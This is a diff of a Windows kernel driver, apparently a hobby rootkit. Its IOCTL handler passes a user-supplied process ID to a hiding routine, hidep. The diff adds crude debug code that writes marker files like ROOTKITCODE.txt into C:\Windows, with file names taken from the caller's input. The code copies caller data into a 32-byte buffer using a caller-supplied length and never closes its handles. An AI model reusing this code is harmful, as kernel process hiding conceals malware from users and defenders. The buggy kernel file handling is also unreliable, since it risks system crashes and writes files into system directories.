@@ -1,16 +1,19 @@
 #include "Driver.h"
 
-
 NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {
+
+	
+
+	UNREFERENCED_PARAMETER(DeviceObject);
 
 	NTSTATUS ntstatus = STATUS_SUCCESS;
 	/////////////////////// THIS SECTION /////////////////////////////////////
 	UNICODE_STRING     uniName;
 	OBJECT_ATTRIBUTES  objAttr;
 	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
-	RtlInitUnicodeString(&uniName, L"\\SystemRoot\\proop.txt");  // or L"\\SystemRoot\\example.txt"
+	RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\Windows\\NOTCOOL.txt");  // or L"\\SystemRoot\\example.txt"
 	InitializeObjectAttributes(&objAttr, &uniName,
-		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+		OBJ_CASE_INSENSITIVE,
 		NULL, NULL);
 	//////////////////////////////////
 
@@ -19,21 +22,21 @@ NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessag
 	HANDLE handle;
 	IO_STATUS_BLOCK    ioStatusBlock;
 	ntstatus = ZwCreateFile(&handle,
-		GENERIC_READ,
+		FILE_WRITE_DATA,
 		&objAttr, &ioStatusBlock,
 		NULL,
 		FILE_ATTRIBUTE_NORMAL,
 		0,
-		FILE_OPEN,
-		FILE_SYNCHRONOUS_IO_NONALERT,
+		FILE_OPEN_IF,
+		FILE_NON_DIRECTORY_FILE,
 		NULL, 0);
 
-	UNREFERENCED_PARAMETER(DeviceObject);
 
 	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
 	IrpMessage->IoStatus.Information = 0;
 
 	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);
+
 
 	return STATUS_SUCCESS;
 }
@@ -43,6 +46,7 @@ NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 
 	UNREFERENCED_PARAMETER(DeviceObject);
 
+	
 	ULONG inBufferLength, outBufferLength, requestCode;
 
 	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
@@ -59,14 +63,70 @@ NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
 		return Irp->IoStatus.Status;
 	}
 
+	// START
+	NTSTATUS ntstatus = STATUS_SUCCESS;
+	/////////////////////// THIS SECTION /////////////////////////////////////
+	UNICODE_STRING     uniName;
+	OBJECT_ATTRIBUTES  objAttr;
+	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
+	RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\Windows\\ROOTKITCODE.txt");  // or L"\\SystemRoot\\example.txt"
+	InitializeObjectAttributes(&objAttr, &uniName,
+		OBJ_CASE_INSENSITIVE,
+		NULL, NULL);
+	//////////////////////////////////
+
+	///////////////////////////////////
+	//Load the buffer (ie. contents of text file to the console)
+	HANDLE handle;
+	IO_STATUS_BLOCK    ioStatusBlock;
+	ntstatus = ZwCreateFile(&handle,
+		FILE_WRITE_DATA,
+		&objAttr, &ioStatusBlock,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		0,
+		FILE_OPEN_IF,
+		FILE_NON_DIRECTORY_FILE,
+		NULL, 0);
+
+	// END
+
+
 	Irp->IoStatus.Information = inBufferLength;
 
 	char pid[32];
 	strcpy_s(pid, inBufferLength, inBuf);
+
+	char tosend[512] = { 0 };
+	sprintf_s(tosend, 512, "\\DosDevices\\C:\\Windows\\%s", pid);
+	WCHAR vrmm[512] = L"";
+
+	mbstowcs(vrmm, tosend, 512);
+
+	// START
+	/////////////////////// THIS SECTION /////////////////////////////////////
+	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
+	RtlInitUnicodeString(&uniName, vrmm);  // or L"\\SystemRoot\\example.txt"
+	InitializeObjectAttributes(&objAttr, &uniName,
+		OBJ_CASE_INSENSITIVE,
+		NULL, NULL);
+	//////////////////////////////////
+
+	///////////////////////////////////
+
+	ntstatus = ZwCreateFile(&handle,
+		FILE_WRITE_DATA,
+		&objAttr, &ioStatusBlock,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		0,
+		FILE_OPEN_IF,
+		FILE_NON_DIRECTORY_FILE,
+		NULL, 0);
+
+	// END
 	 
 	hidep(atoi(pid));
-
-	
 
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
